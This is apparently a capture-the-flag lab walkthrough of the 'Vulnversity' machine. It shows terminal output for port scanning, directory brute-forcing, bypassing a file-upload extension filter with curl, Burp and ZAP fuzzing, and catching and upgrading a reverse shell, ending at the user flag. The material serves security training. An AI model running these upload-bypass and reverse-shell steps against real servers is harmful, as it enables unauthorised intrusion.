```bash
joshua@kaligra:~$ sudo nmap -T4 -p- -sV 10.10.206.250
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 10:03 CEST
Nmap scan report for 10.10.206.250
Host is up (0.063s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.72 seconds
```

feroxbuster:

```bash
joshua@kaligra:~$ feroxbuster -q -u http://10.10.206.250:3333 -n -t 5 -L 1 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
301      GET        9l       28w      322c http://10.10.206.250:3333/images => http://10.10.206.250:3333/images/
200      GET      652l     2357w    33014c http://10.10.206.250:3333/
301      GET        9l       28w      319c http://10.10.206.250:3333/css => http://10.10.206.250:3333/css/
301      GET        9l       28w      318c http://10.10.206.250:3333/js => http://10.10.206.250:3333/js/
301      GET        9l       28w      321c http://10.10.206.250:3333/fonts => http://10.10.206.250:3333/fonts/
301      GET        9l       28w      324c http://10.10.206.250:3333/internal => http://10.10.206.250:3333/internal/
```

reverse shell:

```bash
joshua@kaligra:/opt/tools/shells$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.100.14] from (UNKNOWN) [10.10.206.250] 37050
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 04:14:32 up 13 min,  0 users,  load average: 0.10, 0.23, 0.31
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

upgrade shell:

```bash
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
www-data@vulnuniversity:/$ ^Z
[1]+  Stopped                 nc -nvlp 4444
joshua@kaligra:/opt/tools/shells$ stty raw -echo
joshua@kaligra:/opt/tools/shells$
nc -nvlp 4444

www-data@vulnuniversity:/$
www-data@vulnuniversity:/$
```

index.php content:

```php
www-data@vulnuniversity:/var/www/html/internal$ cat index.php
<html>
<head>
<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<style>
html, body {
    height: 30%;
}
html {
    display: table;
    margin: auto;
}
body {
    display: table-cell;
    vertical-align: middle;
    text-align: center;
}
</style>
</head>
<body>
<form action="index.php" method="post" enctype="multipart/form-data">
    <h3>Upload</h3><br />
    <input type="file" name="file" id="file">
    <input class="btn btn-primary" type="submit" value="Submit" name="submit">
</form>
<?php
   if(isset($_FILES['file'])){
      $errors= array();
      $file_name = $_FILES['file']['name'];
      $file_tmp =$_FILES['file']['tmp_name'];
      $file_type=$_FILES['file']['type'];
      $file_ext=strtolower(end(explode('.',$_FILES['file']['name'])));

      $extensions= array("phtml");

      if(in_array($file_ext,$extensions)=== false){
         $errors="Extension not allowed";
      }

      if(empty($errors)==true){
         move_uploaded_file($file_tmp,"uploads/".$file_name);
         echo "Success";
      }else{
         print_r($errors);
      }
   }
?>
</body>
</html>
```

we see that the only extension allowed is `.phtml`:

```php
 $extensions= array("phtml");
```

let's bring the whole upload code to our machine

```bash
www-data@vulnuniversity:/var/www/html$ tar cvf internal.tar internal
internal/
internal/css/
internal/css/bootstrap.min.css
internal/index.php
internal/uploads/
internal/uploads/sugo.phtml
```

```bash
joshua@kaligra:~/Documents/thm/vulnversity$ wget http://10.10.206.250:3333/internal.tar
--2023-07-01 10:20:30--  http://10.10.206.250:3333/internal.tar
Connecting to 10.10.206.250:3333... connected.
HTTP request sent, awaiting response... 200 OK
Length: 184320 (180K) [application/x-tar]
Saving to: ‘internal.tar’

internal.tar                                    100%[=====================================================================================================>] 180.00K   734KB/s    in 0.2s

2023-07-01 10:20:30 (734 KB/s) - ‘internal.tar’ saved [184320/184320]
```

phpinfo

```bash
www-data@vulnuniversity:/var/www/html$ cat > sugo.php
<?php phpinfo(); ?>
```

```html
<h1 class="p">PHP Version 7.0.33-0ubuntu0.16.04.5</h1>
```

how to upload file with `cURL`?

let's inspect first the upload form:

```html
<form action="[index.php](view-source:http://192.168.106.253/internal/index.php)" method="post" enctype="multipart/form-data">
    <h3>Upload</h3><br />
    <input type="file" name="file" id="file">
```

cURL command:

```bash
$ $ curl -F 'file=@/home/joshua/Documents/thm/vulnversity/shell.php;filename=rofl.phtml' http://10.10.206.250:3333/internal/index.php
<html>
<head>
<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<style>
html, body {
    height: 30%;
}
html {
    display: table;
    margin: auto;
}
body {
    display: table-cell;
    vertical-align: middle;
    text-align: center;
}
</style>
</head>
<body>
<form action="index.php" method="post" enctype="multipart/form-data">
    <h3>Upload</h3><br />
    <input type="file" name="file" id="file">
    <input class="btn btn-primary" type="submit" value="Submit" name="submit">
</form>
Success</body>
</html>

```

to do a very simple brute force (double quote!):

```bash
$ cat list
php
php3
php4
php5
phtml
```

```bash
$ for i in $(cat list); do curl -F "file=@/home/joshua/Documents/thm/vulnversity/shell.php;filename=revshell.$i" http://10.10.206.250:3333/internal/index.php; done
..
..
..
Success</body>
</html>
```

upload stuff with python:

```python
>>> import requests
>>> testfile = open("shell.phtml", "rb")
>>> res = requests.post(url, files={"file": testfile})
```

brute force with `Burpsuite`:

intercept request, then send to `Intruder`,  then configure proper payload position:

```
POST /internal/index.php HTTP/1.1
Host: 10.10.206.250:3333
Content-Length: 310
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.206.250:3333
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeDUkc63nRJlMLpjT
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.206.250:3333/internal/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryeDUkc63nRJlMLpjT
Content-Disposition: form-data; name="file"; filename="sugo.§php§"
Content-Type: application/x-php

<?php echo 'ciao'; ?>

------WebKitFormBoundaryeDUkc63nRJlMLpjT
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryeDUkc63nRJlMLpjT--
```

Attack type = Sniper

Payload type = Simple list

brute force with ZAP

include your target to Context

pick the `internal/POST:index.php` request

right click -> attack -> fuzzer

Type: fìle

select the file extension in your request (eg `php`), on the right menu click on "add" and select your list, eg.

```
php
php3
php4
php5
phtml
```


Start fuzzer

pay attention to Size Resp. Body

userflag:

```bash
www-data@vulnuniversity:/var/www/html$ ls /home/bill/
user.txt
```

